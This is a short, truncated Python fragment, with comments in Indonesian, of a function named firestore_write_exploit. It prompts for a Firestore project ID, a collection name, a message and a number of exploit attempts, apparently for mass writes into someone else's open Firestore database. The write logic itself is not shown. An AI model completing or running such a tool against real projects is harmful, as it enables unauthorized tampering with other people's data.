...
def firestore_write_exploit():
    ...
    # Meminta input
    print(f"{C.INPUT} Masukkan Project ID Firestore: ", end="")
    project_id = input()

    print(f"{C.INPUT} Masukkan Nama Collection: ", end="")
    collection_name = input()

    print(f"{C.INPUT} Masukkan message: ", end="")
    message = input()

    print(f"{C.INPUT} Jumlah exploit: ", end="")
    try:
        count = int(input())
    except ValueError:
